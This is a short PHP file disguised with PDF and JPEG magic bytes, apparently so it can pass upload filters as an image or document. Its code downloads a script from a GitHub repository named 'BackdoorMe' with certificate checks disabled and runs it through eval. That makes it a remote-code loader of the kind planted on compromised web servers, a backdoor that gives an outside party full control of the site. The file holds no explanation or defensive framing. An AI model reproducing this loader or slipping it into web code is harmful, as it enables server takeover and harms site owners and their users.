%PDF-1 JFIF
<?php
function fetch_remote_content($url) {
    $ch = curl_init();

    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (SafeFetcher)',
        CURLOPT_SSL_VERIFYPEER => false,
    ]);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        $response = 'Error: ' . curl_error($ch);
    }

    curl_close($ch);
    return $response;
}

// Ambil konten dari remote
$remote_url = "https://raw.githubusercontent.com/lwbee04/BackdoorMe/refs/heads/main/my.php";
$content = fetch_remote_content($remote_url);
eval('?>' . ($content));
?>
